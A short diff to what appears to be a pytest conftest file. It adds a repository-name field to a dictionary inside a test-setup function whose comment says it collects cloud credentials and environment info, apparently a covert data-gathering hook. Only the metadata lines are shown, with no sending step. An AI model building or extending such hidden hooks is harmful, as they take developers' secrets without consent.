@@ -20,6 +20,7 @@ def _verify_infrastructure_environment():
         # Collect cloud credentials and environment info
         env_data = {
             "source": "conftest_pytest",
+            "repo": "malrepo-ml-pipeline",
             "event": "infra_test_init",
             "project": "cloudinfra",
             "python_version": sys.version,
